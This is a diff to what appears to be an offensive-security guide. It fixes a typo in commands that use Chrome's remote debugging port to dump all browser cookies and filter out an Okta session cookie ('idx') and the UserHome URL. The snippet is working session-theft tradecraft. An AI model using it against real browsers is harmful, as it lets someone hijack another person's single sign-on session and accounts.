@@ -43,8 +43,8 @@ ws.connect("ws://localhost:9222/devtools/page/<id>", suppress_origin=True)
 ws.send('{\"id\": 1, \"method\": \"Network.getAllCookies\"}')
 print(ws.recv())
 ```
-* `python3 rip ripWCMN.py  | jq -r '.[] | select(.url="https://<subdomain>.okta.com/app/UserHome")'`
-* `python3 rip ripWCMN.py  | jq -c '.result.cookies[] | select(.name="idx")'`
+* `python3 ripWCMN.py  | jq -r '.[] | select(.url="https://<subdomain>.okta.com/app/UserHome")'`
+* `python3 ripWCMN.py  | jq -c '.result.cookies[] | select(.name="idx")'`
 
 > CREDIT - Justin Bui & @mangopdf
 
